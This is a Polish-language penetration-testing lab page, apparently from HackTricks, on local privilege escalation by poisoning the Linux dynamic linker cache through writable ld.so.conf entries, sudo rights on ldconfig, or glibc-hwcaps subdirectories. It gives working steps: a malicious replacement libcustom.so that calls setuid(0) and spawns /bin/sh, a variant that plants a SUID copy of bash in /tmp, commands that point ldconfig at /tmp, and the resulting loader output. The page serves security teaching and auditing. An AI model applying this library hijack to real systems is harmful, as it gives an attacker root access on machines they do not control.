# przykład exploita privesc ld.so

{{#include ../../banners/hacktricks-training.md}}

Ta strona zawiera skoncentrowane laboratorium dotyczące zatruwania **cache'a systemowego linkera za pośrednictwem `/etc/ld.so.conf` lub `ldconfig`**. W przypadku wstrzykiwania brakującej biblioteki, zapisywalnych `RPATH`/`RUNPATH`, `LD_PRELOAD` oraz innych typowych nadużyć linkera SUID zobacz [Nadużycie bibliotek współdzielonych i linkera SUID](suid-shared-library-and-linker-abuse.md).

## Przygotowanie środowiska

W poniższej sekcji znajdziesz kod plików, których użyjemy do przygotowania środowiska

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Utwórz** te pliki na swojej maszynie w tym samym folderze
2. **Skompiluj** **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Skopiuj** `libcustom.so` do `/usr/lib` i odśwież cache: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (uprawnienia root)
4. **Skompiluj** **executable**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Sprawdź środowisko

Sprawdź, czy _libcustom.so_ jest **ładowana** z _/usr/lib_ i czy możesz **wykonać** plik binarny.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Przydatne polecenia triage

Podczas atakowania rzeczywistego celu sprawdź **dokładną nazwę biblioteki**, której potrzebuje plik binarny, co **obecnie rozwiązuje loader** oraz które skonfigurowane ścieżki można zapisywać bez modyfikowania aktywnego cache.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```
Używaj `ldd` wyłącznie na **zaufanym** pliku wykonywalnym. Niektóre implementacje lub nietypowe interpretery ELF mogą spowodować wykonanie kodu kontrolowanego przez atakującego; `objdump -p ./file | grep NEEDED` bezpiecznie wyświetla bezpośrednie zależności. W przypadku zaufanego celu wywołanie znalezionego interpretera z opcją `--list` pokazuje rzeczywiste rozwiązywanie zależności.<sup>[[4]](#references)</sup>

Kilka przydatnych pułapek:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` zwykle **nie działa**, ponieważ
przekierowanie jest wykonywane przez bieżącą powłokę. Zamiast tego użyj
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf`.
- Pliki binarne **SUID/privileged** ignorują `LD_LIBRARY_PATH`/`LD_PRELOAD` w
**secure-execution mode**, ale katalogi pochodzące z `/etc/ld.so.conf` nadal
stanowią część zaufanej konfiguracji loadera, więc ta błędna konfiguracja może
nadal wpływać na privileged programs.<sup>[[1]](#references)</sup>
- `LD_DEBUG` również jest ignorowane w secure-execution mode, chyba że istnieje `/etc/suid-debug`, dlatego zbierz jego ślad z równoważnego uruchomienia non-SUID, zamiast oczekiwać danych wyjściowych z privileged execution.<sup>[[1]](#references)</sup>
- W nowszych wersjach glibc dynamic loader udostępnia również
`--list-diagnostics`, co ułatwia debugowanie rozwiązywania cache oraz
wyboru podkatalogu `glibc-hwcaps`, gdy hijack nie działa zgodnie z oczekiwaniami.<sup>[[1]](#references)</sup>

### Ograniczenia cache i SONAME

`ldconfig` nie zapisuje w cache każdego dowolnego pliku w skonfigurowanym katalogu: analizuje nagłówki ELF, rozpoznaje nazwy pasujące do `lib*.so*` lub `ld-*.so*` i oczekuje konwencjonalnego łańcucha `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12`. Wstrzyknięty obiekt musi zatem mieć docelową architekturę/klasę, dokładną nazwę `DT_NEEDED` (zwykle jego `DT_SONAME`) oraz wszystkie symbole/wersje, które rozwiązuje victim.<sup>[[2]](#references)</sup>
```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```
Preferuj bibliotekę specyficzną dla celu, taką jak w tym przykładzie. Przesłonięcie typowego SONAME niekompletnym obiektem może przerwać działanie każdego procesu, który rozwiąże tę zależność, zanim uruchomi się zamierzony uprzywilejowany cel.<sup>[[3]](#references)</sup>

## Exploit

W tym scenariuszu założymy, że **ktoś utworzył podatny wpis** w pliku znajdującym się w _/etc/ld.so.conf_:
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
Podatny katalog to _/home/ubuntu/lib_ (do którego mamy uprawnienia zapisu).\
**Pobierz i skompiluj** poniższy kod w tej ścieżce:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setgid(0);
setuid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Jeśli oczekujesz, że **root** (lub inne uprzywilejowane konto) później wykona podatny plik binarny, zwykle lepiej pozostawić **artefakt należący do root**, zamiast uruchamiać interaktywną powłokę. Na przykład:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Następnie, po wykonaniu uprzywilejowanej operacji, możesz użyć `/tmp/rootbash -p`.

Teraz, gdy **utworzyliśmy złośliwą bibliotekę libcustom w błędnie skonfigurowanej** ścieżce, domyślna pamięć podręczna musi zostać odbudowana przez pomyślne uruchomienie uprzywilejowanego **`ldconfig`**. Ponowne uruchomienie systemu pomaga tylko wtedy, gdy lokalny proces uruchamiania rzeczywiście wywołuje tę operację; w przeciwnym razie należy poczekać na działanie administratora lub użyć niebezpiecznej reguły sudo, jeśli jest dostępna.<sup>[[2]](#references)</sup>

Po wykonaniu tej czynności **sprawdź ponownie**, skąd plik wykonywalny `sharedvuln` ładuje bibliotekę `libcustom.so`:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Jak widać, **ładuje ją z `/home/ubuntu/lib`**, a jeśli dowolny użytkownik ją wykona, zostanie uruchomiona powłoka:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Pamiętaj, że w tym przykładzie nie eskalowaliśmy uprawnień, ale modyfikując wykonywane polecenia i **czekając, aż root lub inny uprzywilejowany użytkownik uruchomi podatny plik binarny**, będziemy mogli eskalować uprawnienia.

### Shadowing `glibc-hwcaps`

Od wersji glibc 2.33 loader może preferować zoptymalizowane biblioteki znajdujące się w `glibc-hwcaps/<level>/` wewnątrz **każdego katalogu wyszukiwania bibliotek**. W związku z tym sprawdzanie wyłącznie `/home/ubuntu/lib` jest niewystarczające: zapisywalny kompatybilny podkatalog, taki jak `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/`, może przesłonić bazową bibliotekę po zindeksowaniu jej przez `ldconfig`, podczas gdy inne procesory nadal będą używać obiektu bazowego. Umożliwia to również przejęcie zależne od architektury, które może zostać pominięte, gdy walidacja odbywa się na innym CPU.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
-o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
Obeczne zalecenia hardeningu glibc zalecają unikanie zduplikowanych SONAME, niestandardowych lokalizacji wyszukiwania oraz obiektów w podkatalogach `glibc-hwcaps`. Z perspektywy audytu należy rekurencyjnie sprawdzać własność i możliwość zapisu dla skonfigurowanych katalogów oraz wszystkich elementów ich ścieżek nadrzędnych.<sup>[[3]](#references)</sup>

### Inne błędne konfiguracje - ta sama vuln

W poprzednim przykładzie sfałszowaliśmy błędną konfigurację, w której administrator **ustawił folder bez uprawnień uprzywilejowanych wewnątrz pliku konfiguracyjnego w `/etc/ld.so.conf.d/`**.\
Istnieją jednak inne błędne konfiguracje, które mogą powodować tę samą podatność. Jeśli masz **uprawnienia zapisu** do któregoś **pliku konfiguracyjnego** w `/etc/ld.so.conf.d`, do folderu `/etc/ld.so.conf.d` lub do pliku `/etc/ld.so.conf`, możesz skonfigurować tę samą podatność i ją wykorzystać.

## Exploit 2

**Załóżmy, że masz uprawnienia sudo do `ldconfig`**.\
Możesz wskazać `ldconfig`, **skąd ma ładować pliki conf**, więc możemy to wykorzystać, aby nakłonić `ldconfig` do załadowania dowolnych folderów.<sup>[[2]](#references)</sup>\
Utwórzmy więc pliki i foldery potrzebne do załadowania "/tmp":
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Teraz, jak wskazano w **poprzednim exploicie**, **utwórz złośliwą bibliotekę w `/tmp`**.\
Na koniec załaduj ścieżkę i sprawdź, skąd binary ładuje bibliotekę:
```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Jak widać, mając uprawnienia sudo do `ldconfig`, można wykorzystać tę samą lukę.** Szczegóły opcji mają znaczenie podczas oceny ograniczonej reguły sudo: `-f` wybiera inną konfigurację, ale nadal przebudowuje `/etc/ld.so.cache`; `-C` przekierowuje pamięć podręczną w inne miejsce; `-N` zapobiega przebudowie pamięci podręcznej; natomiast `-X` zapobiega aktualizowaniu dowiązań, ale **nadal przebudowuje pamięć podręczną, chyba że zostanie użyta razem z `-N`**.<sup>[[2]](#references)</sup>



## References

- [1] [ld.so(8) - strona podręcznika Linuksa](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - strona podręcznika Linuksa](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [Wzmacnianie bezpieczeństwa dynamicznego linkera - GNU C Library](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - strona podręcznika Linuksa](https://man7.org/linux/man-pages/man1/ldd.1.html)
{{#include ../../banners/hacktricks-training.md}}
